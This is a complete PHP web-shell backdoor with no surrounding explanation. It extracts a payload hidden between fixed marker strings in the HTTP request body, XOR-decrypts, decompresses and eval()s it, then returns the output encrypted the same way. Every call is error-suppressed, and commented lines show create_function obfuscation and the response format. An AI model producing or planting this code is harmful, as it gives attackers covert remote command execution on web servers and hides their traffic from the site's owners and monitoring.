<?php
$k="80e32263";
$kh="6f8af44abea0";
$kf="351039f4a7b5";
$p="0UlYyJHG87EJqEz6";
function x($t,$k)
{
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;)
	{
		for($j=0;($j<$c&&$i<$l);$j++,$i++)
		{
			$o.=$t{$i}^$k{$j};
		}
	}
	return $o;
}

if(@preg_match("/$kh(.+)$kf/",@file_get_contents( "php://input"),$m)==1)
{
	@ob_start();
	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
	$o=@ob_get_contents();
	@ob_end_clean();
	$r=@base64_encode(@x(@gzcompress($o),$k));
	print("$p$kh$r$kf");
} 

#$N=str_replace('','','create_function');
#$u=str_replace('','',$V.$d.$P.$c.$B);
#$x=$N('',$j); $x();

#0UlYyJHG87EJqEz66f8af44abea0(--encoded result--)351039f4a7b5
?>
